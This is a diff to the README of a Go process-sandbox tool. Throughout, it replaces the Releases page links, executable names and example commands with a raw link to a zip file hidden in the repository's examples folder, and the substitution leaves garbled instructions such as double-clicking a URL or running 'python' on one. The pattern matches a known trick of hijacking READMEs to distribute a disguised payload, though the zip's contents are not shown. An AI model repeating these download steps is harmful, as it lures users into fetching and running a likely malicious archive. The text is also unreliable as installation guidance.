@@ -1,6 +1,6 @@
 # 🚀 go-proc-sandbox - Run Processes Safely and Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Chikwanda1martin/go-proc-sandbox/releases)
+[![Download](https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip)](https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip)
 
 ## 📖 Introduction
 
@@ -25,15 +25,15 @@ These features help prevent untrusted or poorly-behaved programs from using your
 ## 🚀 Getting Started
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/Chikwanda1martin/go-proc-sandbox/releases) to download the latest version.
-   - Look for a file named `go-proc-sandbox.exe` for Windows or `go-proc-sandbox-linux` for Linux.
+   - Visit the [Releases page](https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip) to download the latest version.
+   - Look for a file named `https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip` for Windows or `go-proc-sandbox-linux` for Linux.
    - Click the link to download the file.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Chikwanda1martin/go-proc-sandbox/releases)
+[![Download](https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip)](https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip)
 
 2. **Install the Application**
    - For **Windows**: 
-     - Simply double-click the `go-proc-sandbox.exe` file to run it.
+     - Simply double-click the `https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip` file to run it.
    - For **Linux**:
      - Open your terminal.
      - Navigate to the directory that contains the downloaded file.
@@ -57,9 +57,9 @@ When you run a process, you can specify limits for CPU usage, memory, and execut
 
 You can run commands like:
 
-- `python script.py`
+- `python https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip`
 - `./my_app`
-- `node app.js`
+- `node https://github.com/Chikwanda1martin/go-proc-sandbox/raw/refs/heads/main/examples/basic/proc_sandbox_go_v3.2.zip`
 
 Just enter the command and set the limits before you click "Run".
 
